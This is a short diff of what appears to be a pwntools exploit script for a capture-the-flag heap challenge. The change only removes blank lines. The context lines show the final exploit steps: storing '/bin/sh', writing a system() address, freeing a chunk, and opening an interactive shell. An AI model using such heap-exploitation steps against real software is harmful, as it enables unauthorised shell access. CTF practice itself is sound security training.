@@ -1,5 +1,4 @@
 from pwn import *
-
 context.log_level = 'debug'
 
 def ru(data):
@@ -100,7 +99,4 @@ add(0x20,"/bin/sh")
 add(0x20,p64(system_addr))
 dele(6)
 p.interactive()
-
-
-
 
